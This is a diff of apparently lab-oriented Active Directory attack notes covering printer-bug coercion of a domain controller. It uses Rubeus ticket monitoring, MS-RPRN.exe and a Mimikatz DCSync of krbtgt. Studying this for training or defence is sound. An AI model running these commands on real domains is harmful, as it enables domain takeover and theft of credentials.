@@ -1092,13 +1092,13 @@ Invoke-Mimikatz -Command '"kerberos::ptt c:\users\appadmin\[0;2ce8b3]-02-60a1000
 # It's possible to ask to a computer to contact the spooler on a third server.
 # The DC will authenticate with its own computer account on the  third server.
 # What if the third server is an owned computer trusted for delegation?
-# it sohuld be possible to capture the DC TGT 
+# it should be possible to capture the DC TGT 
 
 # On the server with unconstrained delegation enabled (dcorp-appsrv), run rubeus in monitor mode to listen for incoming tickets 
 .\Rubeus.exe monitor /interval:5 /nowrap
 
-# from a domain joined machine ask to a DC to notify MS-RPRN to the server:
-.\MS-RPRN.exe \\dcorp.corp.corporate.local \\dcorp-appsrv.corp.corporate.local
+# from a domain joined machine (student VM) ask to a DC to notify MS-RPRN to the server:
+.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
 
 # some tickets will be printed by the rubeus session monitor mode in base64 format.
 # Copy the TGT ticket, remove blanks and new line chars
@@ -1107,7 +1107,7 @@ Invoke-Mimikatz -Command '"kerberos::ptt c:\users\appadmin\[0;2ce8b3]-02-60a1000
 
 #  Now the current session has the same rights as the DC
 # It's possibile to run a DCSYnc attack:
-Invoke-Mimikatz -Command '"lsadump::dcsync /user:corp\krbtgt"'
+Invoke-Mimikatz -Command '"lsadump::dcsync /user:dollarcorp\krbtgt"'
 
 # IT's also possible to do that on LInux with the tool C0ercer
 ```
